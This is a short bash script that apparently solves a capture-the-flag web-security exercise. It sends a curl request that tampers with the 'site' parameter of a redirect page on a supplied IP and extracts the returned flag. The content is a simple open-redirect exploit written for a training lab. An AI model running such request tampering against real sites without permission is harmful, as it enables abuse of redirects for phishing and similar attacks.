#!/bin/bash
#
# ./get-the-redirect-site-flag.sh "ip"
# 

function get_tools
{
	# $1: the command to test if here or need to install
	tool="${1}"
	which "${tool}" 2>&1 > /dev/null
	if [ $? -ne 0 ]
	then
		if [ `uname` = "Darwin" ]
		then
			brew install "${tool}"
		else
			apt-get install -y "${tool}"
		fi
		return 1
	fi
	return 0
}
get_tools "curl"

function simplified_curl_request
{
	# $1:	url/ip to test
	# $2:	queries string to test (those one which from SQL injection, pass all
	#		query string by url ($1)
	curl -svG --data-urlencode "${2}" "${1}" 
	return $?
}

theme="redirecting url via forgery HTTP request"

echo -e "\n\033[35m10. === ${theme} ===============================================\033[0m\n"

echo -e "We want to change the value of the url used for being redirected: \033[33m/?page=redirect&site=blibliibli\033[0m"
flag=`simplified_curl_request "${1}/?page=redirect" "site=blibliibli" | grep -Eo "is the flag : [a-zA-Z0-9]*" | awk '{print $NF}'`
echo -e "Flag earned with redirecting hack: \033[31m${flag}\033[0m"
echo -e "\n\$\$\$ ${theme} \$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\$\n"
